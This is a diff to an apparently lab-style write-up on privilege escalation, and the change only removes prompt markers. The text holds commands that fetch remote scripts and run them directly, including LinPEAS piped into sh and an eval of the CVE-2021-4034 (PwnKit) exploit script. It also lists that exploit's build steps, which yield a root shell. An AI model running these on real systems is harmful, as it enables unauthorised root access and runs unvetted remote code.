@@ -289,21 +289,21 @@ Learning how to transfer files between files different machines.
 
 I've used Linpeas like this first to see which vulnerabilities I could try to exploit :
 
-    > curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 The vulnerability I chose is **CVE-2021-4034** and I downloaded an existing script to exploit it and then I did as instructed in the Readme file :
 
-    > eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
-    > cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
-    > cc -Wall    cve-2021-4034.c   -o cve-2021-4034
-    > echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+    eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
+    cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+    cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+    echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
     mkdir -p GCONV_PATH=.
     cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
 
 Then check user with command :
 
-    > whoami
-    root
+    whoami
+    #root
 
 Then you'll be in the shell as root and be able to navigate to the root folder where you'll find the flag.txt file:
 
